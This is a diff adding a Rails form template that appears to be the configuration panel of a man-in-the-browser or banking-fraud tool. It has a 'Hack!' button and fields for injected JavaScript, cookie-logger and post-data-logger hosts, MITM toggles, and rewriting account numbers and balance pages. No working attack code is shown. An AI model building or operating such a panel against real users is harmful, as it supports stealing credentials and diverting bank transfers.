@@ -1,0 +1,102 @@
+<%= form_for(@ccconfig) do |f| %>
+  <% if @ccconfig.errors.any? %>
+    <div id="error_explanation">
+      <h2><%= pluralize(@ccconfig.errors.count, "error") %> prohibited this ccconfig from being saved:</h2>
+
+      <ul>
+      <% @ccconfig.errors.full_messages.each do |msg| %>
+        <li><%= msg %></li>
+      <% end %>
+      </ul>
+    </div>
+  <% end %>
+
+
+  <div class="field">
+    <%= f.label :jscommand %><br />
+    <%= f.text_field :jscommand, :size => 150 %>
+  </div>
+    <div class="actions">
+    <%= f.submit "Hack!"  ,:id => 'hack'%>
+  </div>
+    
+  <div class="field">
+    <%= f.label :jscommandid %><br />
+    <%= f.number_field :jscommandid %>
+  </div>
+  <div class="field">
+    <%= f.label :"rewrite URL content location" %><br />
+    <%= f.text_field :balancepage, :size => 150 %>
+  </div>
+
+  <div class="field">
+    <%= f.label :"data to overwrite" %><br />
+    <%= f.text_field :myaccount, :size => 150 %>
+  </div>
+    <div class="field">
+    <%= f.label :"new data" %><br />
+    <%= f.text_field :origmsg, :size => 150 %>
+  </div>
+  
+  <div class="field">
+    <%= f.label :checksslvar %><br />
+    <%= f.check_box :checksslvar %>
+  </div>
+  <div class="field">
+    <%= f.label :loginhost %><br />
+    <%= f.text_field :loginhost, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :cookieloggerhost %><br />
+    <%= f.text_field :cookieloggerhost, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :cookieloggingenabled %><br />
+    <%= f.check_box :cookieloggingenabled %>
+  </div>
+  <div class="field">
+    <%= f.label :enablemitm %><br />
+    <%= f.check_box :enablemitm %>
+  </div>
+  <div class="field">
+    <%= f.label :logoutpostdata %><br />
+    <%= f.text_field :logoutpostdata, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :modifyurl %><br />
+    <%= f.text_field :modifyurl, :size => 150 %>
+  </div>
+
+  <div class="field">
+    <%= f.label :newaccount %><br />
+    <%= f.text_field :newaccount, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :origaccount %><br />
+    <%= f.text_field :origaccount, :size => 150 %>
+  </div>
+
+  <div class="field">
+    <%= f.label :postdataloggerhost %><br />
+    <%= f.text_field :postdataloggerhost, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :postenabled %><br />
+    <%= f.check_box :postenabled %>
+  </div>
+  <div class="field">
+    <%= f.label :cookielist %><br />
+    <%= f.text_field :cookielist, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :transferurl %><br />
+    <%= f.text_field :transferurl, :size => 150 %>
+  </div>
+  <div class="field">
+    <%= f.label :uploadpath %><br />
+    <%= f.text_field :uploadpath, :size => 150 %>
+  </div>
+  <div class="actions">
+    <%= f.submit %>
+  </div>
+<% end %>
